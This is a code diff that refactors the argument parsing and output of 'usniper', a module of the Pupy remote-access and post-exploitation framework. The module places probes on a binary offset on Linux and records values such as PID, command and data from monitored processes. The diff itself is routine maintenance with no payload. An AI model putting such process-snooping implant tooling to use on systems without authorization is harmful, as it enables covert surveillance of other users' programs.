@@ -16,9 +16,10 @@ class USniper(PupyModule):
         'linux': [ 'usniper' ]
     }
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='usniper', description=self.__doc__)
-        commands = self.arg_parser.add_subparsers(help='commands')
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='usniper', description=cls.__doc__)
+        commands = cls.arg_parser.add_subparsers(help='commands')
         start = commands.add_parser('start', help='Start USniper')
         start.add_argument('-S', '--string', action='store_true',
             default=False, help='Dereference as string (>3.18)')
@@ -30,13 +31,13 @@ class USniper(PupyModule):
         start.add_argument('offset', help='Offset in binary')
         start.add_argument('reg', default='ax', nargs='?',
                                help='Get value from register')
-        start.set_defaults(func=self.start)
+        start.set_defaults(func=cls.start)
 
         stop = commands.add_parser('stop', help='stop USniper')
-        stop.set_defaults(func=self.stop)
+        stop.set_defaults(func=cls.stop)
 
         dump = commands.add_parser('dump', help='dump results')
-        dump.set_defaults(func=self.dump)
+        dump.set_defaults(func=cls.dump)
 
     def start(self, args):
         offset = args.offset
@@ -88,7 +89,7 @@ class USniper(PupyModule):
                             'CMD': ' '.join(values['cmd'])
                         })
 
-        self.log(self.formatter.table_format(records, wl=['PID', 'EXE', 'CMD', 'DATA']))
+        self.table(records, wl=['PID', 'EXE', 'CMD', 'DATA'])
 
     def run(self, args):
         args.func(args)
